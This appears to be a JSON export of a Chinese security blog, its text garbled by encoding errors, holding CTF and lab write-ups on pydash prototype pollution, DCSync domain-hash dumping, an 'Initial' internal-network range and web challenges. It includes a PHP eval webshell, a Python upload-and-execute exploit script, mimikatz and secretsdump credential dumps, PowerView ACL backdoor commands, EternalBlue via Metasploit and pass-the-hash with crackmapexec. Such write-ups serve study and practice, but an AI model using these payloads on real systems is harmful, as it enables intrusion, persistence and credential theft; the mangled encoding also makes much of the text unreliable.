å…¶é»˜è®¤çš„å€¼ä¸º./å’Œ./views/ï¼Œæˆ‘ä»¬éœ€è¦è¯»å–å…¶environï¼Œå°±å¯ä»¥åˆ©ç”¨../../../proc/self/environæ¥è¯»å–ï¼Œåªéœ€è¦æˆ‘ä»¬å°†TEMPLATE_PATHæ”¹ä¸º../../../proc/self/ç„¶åæŠŠenvironæ”¾å…¥åˆ°å…¶ä¸­è¿›è¡Œæ¸²æŸ“å³å¯å¾—åˆ°ç¯å¢ƒå˜é‡ã€‚ æ¥ä¸‹æ¥å»çœ‹setvalå‡½æ•°\ndef setval(name:str, path:str, value:str)-\u0026gt; Optional[bool]: if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False for word in __forbidden_name__: if name==word: return False for word in __forbidden_path__: if path.find(word)\u0026gt;=0: return False obj=globals()[name] try: pydash.set_(obj,path,value) except: return False return True æ‰€ä»¥ç»“åˆé»‘åå•ï¼Œplayloadåº”è¯¥æ˜¯è¿™æ ·å­çš„\nsetval.__globals__.bottle.TEMPLATE_PATH=[\u0026#39;../../../../../proc/self/\u0026#39;] ä½†æ˜¯pydashæ˜¯ä¸å…è®¸å»ä¿®æ”¹__globals__å±æ€§çš„ï¼Œå»çœ‹â¼€ä¸‹ä»£ç  åœ¨helpers.pyä¸­ æ‰€ä»¥æˆ‘ä»¬è¦å…ˆæ±¡æŸ“è¿™ä¸ªRESTRICTED_KEYSä¹‹åå†å»æ±¡æŸ“bottleçš„å€¼å³å¯ã€‚ æ¥ç€ æœ€åæ¸²æŸ“ å¾—åˆ°flag\n","date":"25 March 2025","externalUrl":null,"permalink":"/posts/pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/","section":"Posts","summary":"\u003cp\u003eé¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²è®ºå›ï¼šhttps://forum.butian.net/share/4251\u003c/p\u003e","title":"PydashåŸå‹é“¾æ±¡æŸ“é“¾å­åˆ†æ","type":"posts"},{"content":"","date":"20 March 2025","externalUrl":null,"permalink":"/tags/dcsync/","section":"Tags","summary":"","title":"DCSync","type":"tags"},{"content":"å‰è¨€ #\rè¿™ä¸ªæ˜¯åœ¨æ‰“äº†äº‘é•œInitialçš„æ—¶å€™æ¥è§¦åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œæ‰€ä»¥æ‰“ç®—æ‹¿å‡ºæ¥è¯¦ç»†å­¦ä¹ ä¸€ä¸‹å…¶åŸç†ï¼Œè¿™é‡Œè´´ä¸€ä¸‹DRSR(Directory Replication Service)åè®®:https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47 å› ä¸ºä¼¼ä¹è¿™ä¸ªæ¼æ´åˆ©ç”¨çš„åŸç†å°±æ˜¯è¿™ä¸ªåè®®\nåœ¨DCSyncæŠ€æœ¯æ²¡æœ‰å‡ºç°ä¹‹å‰ï¼Œæ”»å‡»è€…è¦æƒ³æ‹¿åˆ°åŸŸå†…ç”¨æˆ·çš„hashï¼Œå°±åªèƒ½åœ¨åŸŸæ§åˆ¶å™¨ä¸Šè¿è¡Œ Mimikatz æˆ– Invoke-Mimikatzå»æŠ“å–å¯†ç hashï¼Œä½†æ˜¯åœ¨2015 å¹´ 8 æœˆä»½ï¼Œ Mimkatzæ–°å¢äº†ä¸€ä¸ªä¸»è¦åŠŸèƒ½å«\u0026quot;DCSync\u0026quot;ï¼Œä½¿ç”¨è¿™é¡¹æŠ€æœ¯å¯ä»¥æœ‰æ•ˆåœ° \u0026ldquo;æ¨¡æ‹Ÿ\u0026rdquo; åŸŸæ§åˆ¶å™¨å¹¶ä»ç›®æ ‡åŸŸæ§ä¸Šè¯·æ±‚åŸŸå†…ç”¨æˆ·å¯†ç hashã€‚\næ”»å‡»åŸç† #\rä¸»è¦æ˜¯åˆ©ç”¨ADå¤åˆ¶æŠ€æœ¯ï¼Œåœ¨ä¸€ä¸ªä¼ä¸šå†…éƒ¨ï¼Œä¸ºäº†é˜²æ­¢DCå‡ºé—®é¢˜ï¼Œå°±ä¼šå¸ƒç½®å¤šå°åŸŸæ§ä½œä¸ºADåŸŸçš„å¤‡ä»½ï¼Œå…¶ä½œç”¨å°±æ˜¯åŒæ­¥æ•°æ®æ›´æ–°ï¼Œå› ä¸ºåŸŸå†…éœ€è¦åšèº«ä»½éªŒè¯ï¼Œåˆ©ç”¨è¿™ç§æ–¹æ³•å°±å¯ä»¥å¿«é€Ÿçš„æ›´æ–°ä¿¡æ¯ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±è¦ç”¨åˆ°å‰è¨€è¯´çš„Microsoftçš„è¿œç¨‹ç›®å½•å¤åˆ¶æœåŠ¡åè®®ä¹Ÿå°±æ˜¯DRSRåè®®ï¼Œåœ¨ä¸åŒDCä¹‹é—´æ¯15åˆ†é’Ÿä¼šè¿›è¡Œä¸€æ¬¡æ•°æ®åŒæ­¥ï¼Œè€ŒDYSyncæ”»å‡»å°±æ˜¯åˆ©ç”¨è¿™ä¸ªåœ°æ–¹è¿›è¡Œæ”»å‡» é€šè¿‡ Directory Replication Serviceï¼ˆDRSï¼‰ æœåŠ¡çš„ GetNCChanges æ¥å£å‘åŸŸæ§å‘èµ·æ•°æ®åŒæ­¥è¯·æ±‚\næŸ¥æ‰¾åŸŸå†…å…·æœ‰DCSyncæƒé™çš„ç”¨æˆ· #\ræˆ‘ä»¬å¯ä»¥ä½¿ç”¨powerviewä¸­çš„Add-DomainObjectAclå‡½æ•°å†™å…¥DCSyncæƒé™\nå†™å…¥DCSync #\rSet-ExecutionPolicy Bypass -Scope Process import-module .\\PowerView.ps1 Add-DomainObjectAcl -TargetIdentity \u0026#34;DC=test,DC=com\u0026#34; -PrincipalIdentity haha -Rights DCSync -Verbose é€šè¿‡cmdè°ƒç”¨powershellå†™å…¥\npowershell.exe -exec bypass -command \u0026#34;\u0026amp;{Import-Module .\\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \\\u0026#34;DC=test,DC=com\\\u0026#34; -PrincipalIdentity haha -Rights DCSync -Verbose}\u0026#34; åˆ é™¤DCSync #\rpowershell.exe -exec bypass -command \u0026#34;\u0026amp;{Import-Module .\\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \\\u0026#34;DC=test,DC=com\\\u0026#34; -PrincipalIdentity test -Rights DCSync -Verbose}\u0026#34; powershellå†™å…¥\nImport-Module .\\PowerView.ps1;\rRemove-DomainObjectAcl -TargetIdentity \u0026#34;DC=test,DC=com\u0026#34; -PrincipalIdentity test -Rights DCSync -Verbose æŸ¥è¯¢å…·æœ‰æƒé™çš„ç”¨æˆ· #\rpowershellæŸ¥æ‰¾\nImport-Module .\\Powerview.ps1\rFind-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType -match \u0026#34;DS-Replication-Get-Changes\u0026#34;}\rFind-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType -match \u0026#34;Replicating Directory Changes\u0026#34;} adfindæŸ¥æ‰¾ å¤åˆ¶ç›®å½•æ›´æ”¹ï¼ˆDS-Replication-Get-Changesï¼‰\nAdFind.exe -s subtree -b \u0026#34;DC=test,DC=com\u0026#34; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;\u0026#34;Replicating Directory Changes\u0026#34;;; -recmute å…¨éƒ¨å¤åˆ¶ç›®å½•æ›´æ”¹ (DS-Replication-Get-Changes-All))\nAdFind.exe -s subtree -b \u0026#34;DC=test,DC=com\u0026#34; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;\u0026#34;Replicating Directory Changes All\u0026#34;;; -recmute æ”»å‡» #\rå¦‚æœæ‹¿åˆ°äº†åŸŸå†…ç”¨æˆ·çš„æƒé™ï¼Œåˆ™å¯ä»¥åœ¨åŸŸå†…ç›´æ¥ä½¿ç”¨mimikatzå»dumpåŸŸæ§hashï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨impacketä¸­çš„secretdumpå»dumpå“ˆå¸Œ\nmimikatz\nmimikatz.exe \u0026#34;log Micropoor.txt\u0026#34; \u0026#34;lsadump::dcsync /domain:test.com /all /csv \u0026#34; \u0026#34;exit\u0026#34; secretdump\npython3 secretsdump.py test/admin:www123456#@192.168.189.128 -dc-ip 192.168.189.128\rpython3 secretsdump.py \u0026#39;test.com/admin@dc.test.com\u0026#39; -hashes :6dfad00b946adf3479fba71beeb5e4ac åœºæ™¯ä¸€ #\ræ‹¿åˆ°ä»¥ä¸‹ç”¨æˆ·æƒé™å¯ä»¥ç›´æ¥å†™å…¥DCSync\nAdministratorsç»„å†…çš„ç”¨æˆ·\rdomain adminsç»„\renterprise adminsç»„\råŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ· çœ‹ä¸€ä¸‹ACL\nImport-Module .\\Powerview.ps1\rGet-DomainObjectAcl -Identity admin -domain test.com -ResolveGUIDs å†™å…¥\npowershell.exe -exec bypass -command \u0026#34;\u0026amp;{Import-Module .\\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \\\u0026#34;DC=test,DC=com\\\u0026#34; -PrincipalIdentity admin -Rights DCSync -Verbose}\u0026#34; dump hash\nmimikatz.exe \u0026#34;log Micropoor.txt\u0026#34; \u0026#34;lsadump::dcsync /domain:test.com /all /csv\u0026#34; \u0026#34;exit\u0026#34; åœºæ™¯äºŒ #\rè‹¥å½“å‰ç”¨æˆ·å…·æœ‰WriteDACLæƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥æƒé™å»å†™å…¥DCSyncåŠŸèƒ½\næˆ‘ä»¬å…ˆåœ¨åŸŸæ§ä¸Šç»™ç”¨æˆ·hahaæ·»åŠ WriteDACLçš„æƒé™\nImport-Module .\\PowerView.ps1\rAdd-DomainObjectAcl -TargetIdentity \u0026#34;DC=test,DC=com\u0026#34; -PrincipalIdentity haha -Rights WriteDacl -Verbose å†™å…¥\npowershell.exe -exec bypass -command \u0026#34;\u0026amp;{Import-Module .\\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \\\u0026#34;DC=test,DC=com\\\u0026#34; -PrincipalIdentity haha -Rights DCSync -Verbose}\u0026#34; æƒé™ç»´æŒ #\råˆ©ç”¨æ¡ä»¶ï¼š\nè·å¾—ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™ï¼š\nDomain Adminsç»„å†…çš„ç”¨æˆ· Enterprise Adminsç»„å†…çš„ç”¨æˆ· åˆ©ç”¨åŸç†ï¼š\nå‘åŸŸå†…çš„ä¸€ä¸ªæ™®é€šç”¨æˆ·æ·»åŠ å¦‚ä¸‹ä¸‰æ¡ACE(Access Control Entries)ï¼š\nDS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c) è¯¥ç”¨æˆ·å³å¯è·å¾—åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æƒé™\nå®ç°ä»£ç ï¼š\nhttps://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270\nåˆ©ç”¨æ–¹æ³•ï¼š\næ·»åŠ ACEçš„å‘½ä»¤å¦‚ä¸‹ï¼š\nAdd-DomainObjectAcl -TargetIdentity \u0026#34;DC=test,DC=com\u0026#34; -PrincipalIdentity test1 -Rights DCSync -Verbose è¡¥å……ï¼š\nåˆ é™¤ACEçš„å‘½ä»¤ï¼š\nRemove-DomainObjectAcl -TargetIdentity \u0026#34;DC=test,DC=com\u0026#34; -PrincipalIdentity test1 -Rights DCSync -Verbose æ³¨ï¼š\nå…³äºæ›´å¤šACLçš„å†…å®¹å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼šã€Šæ¸—é€æŠ€å·§â€”â€”Windowsä¸‹çš„Access Control Listã€‹\nä½¿ç”¨åŸŸç”¨æˆ·test1è°ƒç”¨DCSyncçš„æ–¹æ³•å¦‚ä¸‹ï¼š\n1.åœ¨åŸŸå†…ä¸€å°ç™»å½•äº†test1ç”¨æˆ·çš„ä¸»æœºä¸Šé¢ï¼Œç›´æ¥ä½¿ç”¨mimikatzçš„DCSyncåŠŸèƒ½ #\rmimikatz.exe privilege::debug \u0026#34;lsadump::dcsync /domain:test.com /all /csv\u0026#34; exit 2.ä½¿ç”¨runaså®ç°ç™»å½•test1ç”¨æˆ·ï¼Œå†ä½¿ç”¨DCSync #\r(1)å¼¹å‡ºcmd\necho 123456789 | runas /noprofile /user:test\\test1 cmd å¼¹å‡ºçš„cmdä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š\nmimikatz.exe privilege::debug \u0026#34;lsadump::dcsync /domain:test.com /all /csv\u0026#34; exit (2)ä¸å¼¹æ¡†å®ç°\necho 123456789 | runas /noprofile /user:test\\test1 c:\\test\\1.bat 1.batçš„å†…å®¹å¦‚ä¸‹:\nc:\\test\\mimikatz.exe privilege::debug \u0026#34;lsadump::dcsync /domain:test.com /user:administrator /csv\u0026#34; exit\u0026gt;c:\\test\\1.txt æ³¨ï¼š\nåŒç±»çš„å·¥å…·è¿˜æœ‰lsrunasã€lsrunaseå’ŒCPAU\n3.ä½¿ç”¨powershellå®ç°ç™»å½•test1ç”¨æˆ·ï¼Œå†ä½¿ç”¨DCSync #\r(1)å¼¹å‡ºcmd\n$uname=\u0026#34;test\\test1\u0026#34; $pwd=ConvertTo-SecureString \u0026#34;12345678\u0026#34; -AsPlainText â€“Force $cred=New-Object System.Management.Automation.PSCredential($uname,$pwd) Start-Process -FilePath \u0026#34;cmd.exe\u0026#34; -Credential $cred å¼¹å‡ºçš„cmdä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š\nmimikatz.exe privilege::debug \u0026#34;lsadump::dcsync /domain:test.com /user:administrator /csv\u0026#34; exit (2)ä¸å¼¹æ¡†å®ç°\n$uname=\u0026#34;test\\test1\u0026#34; $pwd=ConvertTo-SecureString \u0026#34;12345678\u0026#34; -AsPlainText â€“Force $cred=New-Object System.Management.Automation.PSCredential($uname,$pwd) Start-Process -FilePath \u0026#34;c:\\test\\1.bat\u0026#34; -Credential $cred 1.batçš„å†…å®¹å¦‚ä¸‹:\nc:\\test\\mimikatz.exe privilege::debug \u0026#34;lsadump::dcsync /domain:test.com /user:administrator /csv\u0026#34; exit\u0026gt;c:\\test\\1.txt æ³¨ï¼š\nä½¿ç”¨wmicåœ¨æœ¬æœºå®ç°ç™»å½•ç”¨æˆ·test1ä¼šå¤±è´¥ï¼Œé”™è¯¯å¦‚ä¸‹ï¼š\nERROR:\rDescription = User credentials cannot be used for local connections å‚è€ƒæ–‡ç« : https://tttang.com/archive/1634/#toc_1dcsync_1 https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync\n","date":"20 March 2025","externalUrl":null,"permalink":"/posts/dcsync-learning/","section":"Posts","summary":"","title":"DCSync Learning","type":"posts"},{"content":"","date":"20 March 2025","externalUrl":null,"permalink":"/categories/%E5%86%85%E7%BD%91/","section":"Categories","summary":"","title":"å†…ç½‘","type":"categories"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/initial/","section":"Tags","summary":"","title":"Initial","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/pth/","section":"Tags","summary":"","title":"PTH","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/tags/sudo%E6%8F%90%E6%9D%83/","section":"Tags","summary":"","title":"Sudoææƒ","type":"tags"},{"content":"","date":"18 March 2025","externalUrl":null,"permalink":"/categories/%E4%BA%91%E9%95%9C/","section":"Categories","summary":"","title":"äº‘é•œ","type":"categories"},{"content":"è¿›æ¥æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ æ³¨å†Œä¸äº†è´¦å·æŒ‡å‘äº†#ï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹çœ‹å“ªé‡Œèƒ½æ‰“ fscanæ‰«ä¸€ä¸‹å‘ç°think5.0.23ç„¶åæ‰“rce ç„¶åå°è¯•å†™ä¸€å¥è¯æœ¨é©¬ echo '\u0026lt;?php eval($_POST[cmd]); ?\u0026gt;' \u0026gt; shell.php yjè¿ä¸€ä¸‹ ç„¶åsudo -lçœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆèƒ½ç”¨çš„ è¿™é‡Œå†æ‹“å±•ä¸€ä¸‹sudoè¯­æ³•\nsudo [options] [command] -bï¼šåœ¨åå°æ‰§è¡ŒæŒ‡ä»¤ï¼› -Eï¼šç»§æ‰¿å½“å‰ç¯å¢ƒå˜é‡ï¼› -hï¼šæ˜¾ç¤ºå¸®åŠ©ï¼› -Hï¼šå°† HOME ç¯å¢ƒå˜é‡è®¾ä¸ºæ–°èº«ä»½çš„ HOME ç¯å¢ƒå˜é‡ï¼› -kï¼šç»“æŸå¯†ç çš„æœ‰æ•ˆæœŸé™ï¼Œä¹Ÿå°±æ˜¯ä¸‹æ¬¡å†æ‰§è¡Œ sudo æ—¶ä¾¿éœ€è¦è¾“å…¥å¯†ç ï¼› -lï¼šåˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤ï¼› -pï¼šæ”¹å˜è¯¢é—®å¯†ç çš„æç¤ºç¬¦å·ï¼› -s\u0026lt;shell\u0026gt;ï¼šæ‰§è¡ŒæŒ‡å®šçš„ shellï¼› -u\u0026lt;user\u0026gt;ï¼šä»¥æŒ‡å®šçš„ç”¨æˆ·ä½œä¸ºæ–°çš„èº«ä»½ã€‚è‹¥ä¸åŠ ä¸Šæ­¤å‚æ•°ï¼Œåˆ™é¢„è®¾ä»¥ root ä½œä¸ºæ–°çš„èº«ä»½ï¼› -vï¼šå»¶é•¿å¯†ç æœ‰æ•ˆæœŸé™ 5 åˆ†é’Ÿï¼› -Vï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ å‘ç°æœ‰ä¸€ä¸ªmysqlï¼Œç„¶ååˆ©ç”¨mysqlææƒ è¿™é‡Œçš„é€»è¾‘å°±æ˜¯ï¼Œçœ‹ä¸€ä¸‹æˆ‘ä»¬èƒ½ç”¨çš„å“ªä¸€ä¸ªå‘½ä»¤æœ‰sudoæƒé™ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªæƒé™å»æ‰“é«˜æƒé™ å…³äºmysql -eè¿™ä¸ªå‘½ä»¤çš„è§£é‡Š æ‰€ä»¥æˆ‘ä»¬å…ˆè¯»æ–‡ä»¶ï¼Œæ‰¾ä¸€ä¸‹flagåœ¨å“ªé‡Œ æ‹¿ä¸‹ç¬¬ä¸€æ®µ flag{60b53231- ç„¶åæ¥ç€æ‰“å†…ç½‘,ä¼ ä¸€ä¸ªfscanä¸Šå» è®°å¾—ç»™æ‰§è¡Œæƒé™ ç„¶ååœ¨å†…ç½‘çš„èµ„æºï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»ºç«‹ä¸€ä¸ªå†…ç½‘éš§é“ï¼Œè¿™é‡Œç”¨chisel å®‰è£…: ç¬¬ä¸€æ¬¡ç”¨è¿™ä¸ªå·¥å…·æ‰€ä»¥ä¹Ÿè¦äº†è§£ä¸€ä¸‹åŸç†å§: å»ºç«‹äº†ä¸€ä¸ªéš§é“å¹¶ä¸”åˆ©ç”¨sshåŠ å¯†ä¼ è¾“ä¿è¯äº†å®‰å…¨æ€§ vpsä¸Šreverseä»£ç† ç„¶åé¶æœºä¸Šç»™ä¸€ä¸ªæ­£å‘ æœ€åé…ç½®ä¸€ä¸‹ç«ç‹å³å¯è®¿é—® ç„¶åè¿™é‡Œå…ˆé…ä¸€ä¸‹kaliçš„proxychainså› ä¸ºåç»­è¦ç”¨åˆ° ç„¶ååˆ©ç”¨pocæ‰“åå°ï¼ˆçœç•¥äº†å‰é¢å¼±å£ä»¤éƒ¨åˆ†ï¼Œå…¶å®å°±ä¸€ä¸ªbase64åŠ å¯†çˆ†ç ´å³å¯ï¼‰ exp.python\nimport requests session = requests.session() url_pre = \u0026#39;http://172.22.1.18/\u0026#39; url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=11\u0026#39; data1 = { \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; } r = session.post(url1, data=data1) r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r+\u0026#39;)}) filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; id = r.json()[\u0026#39;id\u0026#39;] print(id) print(filepath) url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; r = session.get(url3) r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) print(r.text) æˆåŠŸå†™å…¥ èšå‰‘è¿æ¥ä¸€ä¸‹ï¼ˆæ³¨æ„é…ä¸€ä¸‹ä»£ç†ï¼‰ flag02:2ce3-4813-87d4-\nç„¶åè¿˜æœ‰ä¸€å°æœºå™¨ è¿™é‡Œfscanä¹‹å‰æ‰«åˆ°è¿‡æ—¶ms17-101æ‰“çš„ è¿™é‡Œè·Ÿç€çŒ«andç‹—å¸ˆå‚…ç”¨msfå§ï¼ˆå½“ä¸€ä¼šè„šæœ¬å°å­ï¼ï¼‰\nproxychains4 msfconsole use exploit/windows/smb/ms17_010_eternalblue set payload windows/x64/meterpreter/bind_tcp_uuid set RHOSTS 172.22.1.21 exploit æ‹¿ä¸‹ æ‹¿åˆ°hashåç›´æ¥æ‰“å°±è¡Œ\nproxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; å‚è€ƒé“¾æ¥: https://fushuling.com/index.php/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7initial/\n","date":"18 March 2025","externalUrl":null,"permalink":"/posts/initial/","section":"Posts","summary":"","title":"äº‘é•œ-Initial","type":"posts"},{"content":"","date":"10 March 2025","externalUrl":null,"permalink":"/tags/ast/","section":"Tags","summary":"","title":"Ast","type":"tags"},{"content":"","date":"10 March 2025","externalUrl":null,"permalink":"/tags/shadow-dom/","section":"Tags","summary":"","title":"Shadow Dom","type":"tags"},{"content":"é¦–å‘äºå…ˆçŸ¥ç¤¾åŒº: https://xz.aliyun.com/news/17071\nOnline Python Editor #\rè¿›æ¥åæ˜¯ä¸€ä¸ªçº¿ä¸Šçš„python editorï¼Œæ ¡éªŒä½ è¾“å…¥çš„pythonè¯­æ³•æ˜¯å¦æ­£ç¡®ã€‚è¿™é‡Œç»™äº†dockefileå’Œä¸€äº›æ–‡ä»¶ï¼Œæˆ‘ä»¬çœ‹çœ‹\napp.py #\rimport ast import traceback from flask import Flask, render_template, request app = Flask(__name__) @app.get(\u0026#34;/\u0026#34;) def home(): return render_template(\u0026#34;index.html\u0026#34;) @app.post(\u0026#34;/check\u0026#34;) def check(): try: ast.parse(**request.json) return {\u0026#34;status\u0026#34;: True, \u0026#34;error\u0026#34;: None} except Exception: return {\u0026#34;status\u0026#34;: False, \u0026#34;error\u0026#34;: traceback.format_exc()} if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) secret.py #\rdef main(): print(\u0026#34;Here\u0026#39;s the flag: \u0026#34;) print(FLAG) FLAG = \u0026#34;TRX{fake_flag_for_testing}\u0026#34; main() ç„¶ååœ¨index.htmlä¸­\nfunction checkCode() { var source = editor.getValue(); fetch(\u0026#39;/check\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ source: source }) }) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { editor.operation(function () { editor.eachLine(function (line) { editor.removeLineClass(line, \u0026#39;background\u0026#39;, \u0026#39;highlight-line\u0026#39;); }); }); if (data.status === false \u0026amp;\u0026amp; data.error) { var errorLine = parseInt(data.error.split(\u0026#39;line \u0026#39;).pop().split(\u0026#39;,\u0026#39;)[0]) - 1; console.log(\u0026#34;Error at line:\u0026#34;, errorLine); editor.addLineClass(errorLine, \u0026#39;background\u0026#39;, \u0026#39;highlight-line\u0026#39;); } }); } åšäº†ä¸€ä¸ªè¯·æ±‚ï¼Œæ‰€ä»¥é€»è¾‘å°±æ˜¯ï¼Œæˆ‘ä»¬åœ¨ç½‘é¡µä¸­è¾“å…¥å†…å®¹ï¼Œç„¶åä»–æŠŠæˆ‘ä»¬è¾“å…¥åçš„å†…å®¹å‘é€åˆ°åç«¯çš„checkè·¯ç”±è¿›è¡Œæ£€æŸ¥ï¼Œåˆ©ç”¨ast.parseæ¥æ„æˆè¯­æ³•æ ‘ï¼Œå¦‚æœæœ‰é”™è¯¯å°±è°ƒç”¨traceback.format_exc()å‡½æ•°æŠ¥é”™ã€‚\næˆ‘ä»¬è¿™é‡Œå…ˆéšä¾¿ç¤ºä¾‹ æ§åˆ¶å°ä¸­ä¾¿æœ‰æŠ¥é”™ï¼Œå¹¶ä¸”å‘Šè¯‰ä½ åœ¨ç¬¬å‡ è¡Œï¼Œç„¶ååœ¨è¯·æ±‚ä¸­ä¼šè¿™æ ·æŠ¥é”™ ä¼štracebackçˆ†å‡ºé”™è¯¯ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸‹astè¾…åŠ©å‡½æ•° ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æŒ‡å®šä¸€ä¸ªfilenameä½œä¸ºä»–çš„è¾“å…¥æ–‡ä»¶ã€‚ æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåº”è¯¥æ˜¯ä¼ å…¥ä¸€ä¸ªsecret.pyåˆšå¥½ä»–çš„flagä½ç½®åœ¨ç¬¬å…­è¡Œï¼Œæˆ‘ä»¬å°±æ„é€ 5ä¸ªæ¢è¡Œç¬¦\\nï¼Œç„¶ååŠ ä¸Šä¸€ä¸ª:ï¼ˆåªè¦ä»¤ä»–æŠ¥é”™å°±è¡Œï¼‰ï¼Œä»–å°±ä¼šæŠŠç¬¬å…­è¡Œçš„æŠ¥é”™å†…å®¹è¾“å‡ºå‡ºæ¥ï¼Œåˆšå¥½ä¹Ÿæ˜¯flagä½ç½®ï¼Œæ‰€ä»¥å°±èƒ½å¾—åˆ°flag æœ€åæ‰“æ³•ï¼š å†…å¿ƒosï¼šå½“æ—¶å·²ç»è¯»åˆ°ç¬¬ä¸€è¡Œäº†ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°\\nèƒ½å¾€ä¸‹é¢è¯»è¿™ä¸ªç‰¹æ€§\u0026hellip;.\nBaby Sandbox #\råŒæ ·ä¹Ÿæ˜¯æœ‰é™„ä»¶ï¼Œæˆ‘ä»¬æ‹¿å‡ºæ¥çœ‹çœ‹\nserver.js #\rconst express = require(\u0026#34;express\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const process = require(\u0026#34;process\u0026#34;); const app = express() const bot = require(\u0026#34;./bot\u0026#34;); let PORT = process.env.PORT || 1337 app.use(express.json()); app.use((req, res, next) =\u0026gt; { res.setHeader(\u0026#34;Content-Security-Policy\u0026#34;, \u0026#34;default-src \u0026#39;none\u0026#39;; frame-ancestors \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;; form-action \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;;\u0026#34;); next() }) app.set(\u0026#34;view engine\u0026#34;, \u0026#34;ejs\u0026#34;) app.set(\u0026#34;views\u0026#34;, path.join(__dirname, \u0026#34;views\u0026#34;)) app.get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { let payload = req.query.payload || \u0026#39;\u0026lt;p\u0026gt;Hello World\u0026lt;/p\u0026gt;\u0026#39;; payload = payload.replace(/[^\\S ]/g, \u0026#39;\u0026#39;); res.render(\u0026#34;index\u0026#34;, { payload }); }); app.post(\u0026#34;/visit\u0026#34;, async (req, res) =\u0026gt; { let payload = req.body.payload if (!payload) return res.status(400).send(\u0026#34;Missing payload\u0026#34;) if(typeof payload !== \u0026#34;string\u0026#34;) return res.status(400).send(\u0026#34;Bad request\u0026#34;) try { let result = await bot.visit(payload) res.send(result) } catch (err) { console.error(err) res.status(500).send(\u0026#34;An error occurred\u0026#34;) } }) 